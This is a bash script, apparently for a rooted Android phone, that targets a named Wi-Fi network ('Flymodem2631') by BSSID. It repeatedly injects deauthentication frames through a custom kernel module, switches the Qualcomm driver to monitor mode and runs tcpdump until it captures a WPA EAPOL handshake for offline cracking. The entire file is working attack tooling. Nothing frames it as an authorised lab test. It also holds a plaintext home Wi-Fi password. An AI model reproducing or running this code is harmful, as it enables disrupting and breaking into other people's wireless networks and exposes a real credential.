#!/bin/bash
# grab_hs11.sh - Faster handshake capture for Flymodem2631
# Key improvement: 0.2s pause between rmmod/insmod (vs 1.0s before)
# Uses petx11 (3 deauths + 100ms TX wait) instead of petx8
set -o pipefail

ROUNDS="${1:-20}"
CAPTURE_SEC="${2:-30}"
DRIVER="/tmp/qca_cld3_wlan.ko"

# Target AP
TARGET_BSSID="8C:F0:DF:1F:4F:C7"
TARGET_SSID="Flymodem2631"
TARGET_FREQ=2452  # ch9

# Home AP (2.4G for recovery)
HOME_BSSID_24="8C:DE:F9:B3:9E:1F"
HOME_PSK="9006609b29404a"

PAUSE_RMMOD=0.2

echo ""
echo "============================================"
echo " Handshake Capture - Flymodem2631"
echo " Channel: 9 ($TARGET_FREQ MHz)"
echo " Rounds: $ROUNDS, Capture: ${CAPTURE_SEC}s/round"
echo " rmmod→insmod pause: ${PAUSE_RMMOD}s"
echo " Deauth: petx11 (unicast+broadcast, 100ms TX wait)"
echo "============================================"
echo ""

wait_wlan0() {
    for i in $(seq 1 100); do
        [ -e /sys/class/net/wlan0 ] && return 0
        sleep 0.05
    done
    return 1
}

cleanup() {
    echo ""
    echo "[*] Cleaning up..."
    killall wpa_supplicant tcpdump 2>/dev/null
    rmmod wlan 2>/dev/null
    sleep 2
    insmod "$DRIVER" 2>/dev/null
    wait_wlan0 && sleep 3
    systemctl start NetworkManager 2>/dev/null
    sleep 2
    nmcli device wifi connect "$HOME_BSSID_24" password "$HOME_PSK" ifname wlan0 2>/dev/null
    echo "[*] WiFi restored."
}
trap cleanup EXIT

cat > /tmp/wpa_flymodem.conf << 'WPAEOF'
ctrl_interface=/tmp/wpa_ctrl
network={
    ssid="Flymodem2631"
    bssid=8C:F0:DF:1F:4F:C7
    psk="dummypassword1234567890123456"
    key_mgmt=WPA-PSK
    scan_freq=2452
}
WPAEOF

rm -f /tmp/hs_grab*.pcap /tmp/handshake_result.pcap
HANDSHAKE_FOUND=0

for round in $(seq 1 "$ROUNDS"); do
    echo "========== ROUND $round/$ROUNDS =========="

    # === PHASE 1: Load STA driver ===
    systemctl stop NetworkManager 2>/dev/null
    killall wpa_supplicant tcpdump 2>/dev/null
    sleep 0.2
    rmmod wlan 2>/dev/null
    sleep 1
    insmod "$DRIVER"
    wait_wlan0 || { echo "  [!] wlan0 not found"; continue; }
    sleep 2
    ip link set wlan0 up
    sleep 0.5

    # === PHASE 2: Associate with target ===
    rm -rf /tmp/wpa_ctrl; mkdir -p /tmp/wpa_ctrl
    dmesg -C
    wpa_supplicant -i wlan0 -c /tmp/wpa_flymodem.conf -B -D nl80211 2>/dev/null

    PE_FOUND=0
    for w in $(seq 1 200); do
        if dmesg | tail -50 | grep -q "Connecting to.*Flymodem\|Connecting to.*f0:df"; then
            PE_FOUND=1
            break
        fi
        sleep 0.05
    done

    if [ "$PE_FOUND" -eq 0 ]; then
        echo "  [-] No PE session, skipping"
        killall wpa_supplicant 2>/dev/null
        continue
    fi

    # Wait for TX power > 0 (means radio is up and associated)
    echo -n "  [*] Waiting for TX power: "
    TXPWR="0.00"
    for tp in $(seq 1 100); do
        TXPWR=$(iw dev wlan0 info 2>/dev/null | grep txpower | awk '{print $2}')
        if [ -n "$TXPWR" ] && [ "$TXPWR" != "0.00" ]; then
            echo "${TXPWR} dBm (${tp}0ms)"
            break
        fi
        sleep 0.1
    done
    if [ "$TXPWR" = "0.00" ]; then
        # Force TX power via iwpriv
        iwpriv wlan0 setTxPower 20 2>/dev/null
        sleep 0.2
        TXPWR=$(iw dev wlan0 info 2>/dev/null | grep txpower | awk '{print $2}')
        echo "forced → ${TXPWR} dBm"
    fi

    # === PHASE 3: Fire deauths (petx11 = 3 deauths + 100ms wait) ===
    DEAUTH_OK=0
    echo -n "  [*] petx11 iterations: "
    for f in $(seq 1 5); do
        dmesg -C
        insmod /tmp/petx11.ko 2>/dev/null
        if dmesg | grep -q "Deauth TX"; then
            DEAUTH_OK=$((DEAUTH_OK + 1))
            echo -n "+"
        else
            echo -n "x"
        fi
        sleep 0.15
    done
    echo " ($DEAUTH_OK/5)"

    if [ "$DEAUTH_OK" -eq 0 ]; then
        echo "  [-] No deauths succeeded"
        killall wpa_supplicant 2>/dev/null
        continue
    fi

    # === PHASE 4: FAST switch to monitor (minimal pause) ===
    killall wpa_supplicant 2>/dev/null

    T0=$(date +%s%N)
    rmmod wlan
    sleep "$PAUSE_RMMOD"
    insmod "$DRIVER" con_mode_monitor=4
    if ! wait_wlan0; then
        echo "  [!] Monitor mode failed (CDS error?), retrying with longer pause"
        rmmod wlan 2>/dev/null
        sleep 1
        insmod "$DRIVER" con_mode_monitor=4
        wait_wlan0 || { echo "  [!] Monitor mode failed again"; continue; }
    fi
    ip link set wlan0 up
    iw dev wlan0 set freq "$TARGET_FREQ"
    T1=$(date +%s%N)
    SWITCH_MS=$(( (T1-T0)/1000000 ))
    echo "  [*] Switch: ${SWITCH_MS}ms"

    # === PHASE 5: Capture ===
    PCAP="/tmp/hs_grab${round}.pcap"
    timeout "$CAPTURE_SEC" tcpdump -i wlan0 -w "$PCAP" 2>/dev/null &
    TCPID=$!
    echo "  [*] Capturing ch9 for ${CAPTURE_SEC}s..."
    wait $TCPID 2>/dev/null

    FSIZE=$(stat -c%s "$PCAP" 2>/dev/null || echo 0)

    # Check for EAPOL
    EAPOL_COUNT=0
    if [ "$FSIZE" -gt 24 ]; then
        EAPOL_COUNT=$(tcpdump -r "$PCAP" -nn 2>/dev/null | grep -ic "EAPOL\|802.1X" || true)
        EAPOL_COUNT=$(echo "$EAPOL_COUNT" | tr -d '[:space:]')
        [ -z "$EAPOL_COUNT" ] && EAPOL_COUNT=0
    fi

    echo "  [*] Captured: ${FSIZE}B, EAPOL: $EAPOL_COUNT"

    if [ "$EAPOL_COUNT" -gt 0 ]; then
        echo ""
        echo "  [!!!] EAPOL DETECTED!"
        cp "$PCAP" /tmp/handshake_result.pcap
        HANDSHAKE_FOUND=1
        break
    fi
    echo ""
done

echo ""
echo "============================================"
if [ "$HANDSHAKE_FOUND" -eq 1 ]; then
    echo " SUCCESS! Handshake saved to /tmp/handshake_result.pcap"
    echo " Pull: adb pull /tmp/handshake_result.pcap"
else
    echo " No handshake captured in $ROUNDS rounds"
fi
echo "============================================"
